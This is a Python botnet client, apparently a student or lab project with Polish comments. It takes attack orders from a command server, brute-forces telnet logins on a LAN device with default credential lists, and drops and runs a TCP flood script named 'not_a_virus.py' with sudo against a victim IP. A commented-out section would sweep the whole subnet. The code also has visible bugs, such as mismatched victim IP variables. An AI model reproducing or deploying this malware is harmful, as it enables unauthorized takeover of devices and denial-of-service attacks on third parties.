import socket
import time
import telnetlib
from _thread import start_new_thread

attack = False
attack_type=''

def telnetConnect(ip_address, victimIP, attackType):
    # można zrobić pętlę do wczytywania user credentials z pliku
    users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
    passwords = ['Ciumcium', 'toor', 'admin', 'root', 'user', 'raspberry']


    for user in users:
        print('connecting with login: ' + user)
        for password in passwords:
            time.sleep(10)
            if not attack:
                print("telnet return")

            try:
                tn = telnetlib.Telnet(ip_address, port=23)

            except:
                # if ip_addres does not respond return
                return

            # print(' and passwd: ' + password)
            try:
                tn.read_until(b"login: ")
                tn.write(user.encode('ascii') + b"\n")
                if password:
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
            except EOFError:
                print("error")
                tn.close()
                continue

            print("attacktype= "+str(attackType))

            if attackType == '1':  # note
                print('pingujemy..')
                tn.write(b"ping 192.168.100.6\n")
                if not attack:
                    print("stopping attack")
                    return
                time.sleep(60)

                # file = open('icmp_flood_code.txt', 'r')
                # str1 = file.read()
                # print(tn.write(b"touch Not_A_VirusICMP.py"))
                # print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'Not_A_VirusICMP.py', encoding="ascii")))
                # print(tn.write(b"python Not_A_VirusICMP.py"))
                # file.close()

                if not attack:  # zrobić wątek sprawdzający czy przerwac atatak thread()
                    # print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
                    tn.write(telnetlib.IP)  # chyba tak
                    return

                tn.write(b"exit\n")

                # print(tn.read_all().decode('ascii'))

            if attackType == '2':
                file = open('tcp_flood_code.txt', 'r')
                strr = file.read()
                newstr = strr.replace("destination_ip", victim_ip)
                str1 = newstr.replace('destination_port', '80')
                file.close()

                bfile = bytes(str1.encode())
                tn.write(b"rm not_a_virus.py\n")
                tn.write(b"touch not_a_virus.py\n")
                print("1\n")
                tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus.py' + b'\n')
                print('2')

                tn.write(b"sudo python not_a_virus.py\n")
                tn.write(b"ls\n")

                tn.write(b"exit\n")
                time.sleep(60)


                if not attack:
                    print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
                    # tn.write(telnetlib.IP)  # chyba tak
                    return
                print(tn.read_all().decode('ascii'))
                tn.write(b"exit\n")
                return

                    # tn.write(b"exit\n")
            tn.close()
    print("telnet is done")
    # t.close()


def checkForOtherDevices(ip, victimIP):
    x = 2
    l = len(ip)
    g = ip.split('.')[-1]
    ip = ip[:l - len(g)]
    print('connecting to telnet...')
    start_new_thread(telnetConnect, ("192.168.100.8", victimIP, attack_type))
    # while x < 254:
    #     if not attack:
    #         return
    #     current_address = ip + str(x)
    #     # próbuj połączyć z każdym przez telnet
    #     # print(current_address)
    #     start_new_thread(telnetConnect, (current_address, victimIP, 2))
    #     x += 1

    print('finished')


if __name__ == '__main__':

    #HOST = '192.168.100.11'  # The server's hostname or IP address
    HOST = '127.0.0.1'
    PORT = 65432  # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        connected = 0
        while True:
            # connected == 1 -> bot is connected
            # connected == 0 -> bot is disconnected
            if connected == 1:
                continue

            while connected != 1:
                time.sleep(0.5)
                try:
                    print('trying to connect... ')
                    s.connect((HOST, PORT))
                    # send info to server that a bot is connected
                    s.send('1'.encode())
                    connected = 1
                except:
                    print("couldn't connect to: "+HOST)
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    connected = 0
                    continue
                time.sleep(1)
                print("Connection established!")
            try:
                data = str(s.recv(1).decode())
                print('Received', str(data))
                if data == '1' or data=='2' :
                    attack_type=data
                    victim_ip = str(s.recv(16).decode())
                    print('victim address:' + str(victim_ip))
                    checkForOtherDevices(HOST, victim_ip)
                    attack = True
                else:
                    print('something went wrong')
                # todo:zrobić try zeby sie nie wywalilo
                stop = str(s.recv(1).decode())
                if stop == '0':
                    attack = False
                    print("Stopping")
                    HOST = str(s.recv(16).decode())
                    connected = 0
                time.sleep(5)
            except:
                connected = 0
